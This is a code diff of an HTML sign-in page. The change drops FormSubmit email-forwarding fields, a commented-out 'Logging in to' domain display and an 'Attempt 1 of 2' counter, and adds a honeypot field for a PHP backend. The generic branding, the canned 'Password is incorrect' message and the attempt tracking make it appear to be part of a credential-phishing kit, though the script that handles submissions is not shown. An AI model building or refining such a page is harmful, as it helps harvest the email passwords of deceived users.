@@ -301,50 +301,36 @@
     
     <!-- Login form -->
     <form class="container" id="login-form">
-        <div class="img">
-            <div class="" align="center">
-                <img id="logo" style="width: 80px; height: 80px;">
-                <!-- <div class="logo-fallback" id="logo-fallback">✓</div> -->
-            </div>
+    <div class="img">
+        <div class="" align="center">
+            <img id="logo" style="width: 80px; height: 80px;">
+            <div class="logo-fallback" id="logo-fallback">✓</div>
         </div>
-        
-        <!-- REMOVED: Domain info section -->
-        <!-- <div class="domain-info" id="domain-info">
-            Logging in to: <span class="domain-name" id="current-domain">example.com</span>
-        </div> -->
-        
-        <!--<div class="attempt-info" id="attempt-info">
-            <span id="attempt-text">Attempt 1 of 2</span>
-        </div>-->
-        
-        <h3 id="title">Sign In</h3>
-        
-        <div id="error">Password is incorrect, please try again!</div>
-        <div id="success">Login successful! Redirecting...</div>
-        
-        <div class="form-group">
-            <label for="email">Email Address</label>
-            <input type="email" placeholder="Enter Email" name="email" id="email" required>
-        </div>
-        
-        <div class="form-group">
-            <label for="psw">Password</label>
-            <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
-        </div>
-        
-        <!-- FormSubmit requires these fields -->
-        <input type="hidden" name="_subject" value="New Login Form Submission">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
-        <input type="text" name="_honey" style="display:none">
-        
-        <button type="submit" class="btn" id="submit-btn">
-            <span id="btn-text">Sign In</span>
-            <div class="loader" id="loader"></div>
-        </button>
-        
-    </form>
+    </div>
+    
+    <h3 id="title">Sign In</h3>
+    
+    <div id="error">Password is incorrect, please try again!</div>
+    <div id="success">Login successful! Redirecting...</div>
+    
+    <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" placeholder="Enter Email" name="email" id="email" required>
+    </div>
+    
+    <div class="form-group">
+        <label for="psw">Password</label>
+        <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
+    </div>
+    
+    <!-- Honeypot field for PHP backend -->
+    <input type="text" name="_honey" style="display:none">
+    
+    <button type="submit" class="btn" id="submit-btn">
+        <span id="btn-text">Sign In</span>
+        <div class="loader" id="loader"></div>
+    </button>
+</form>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
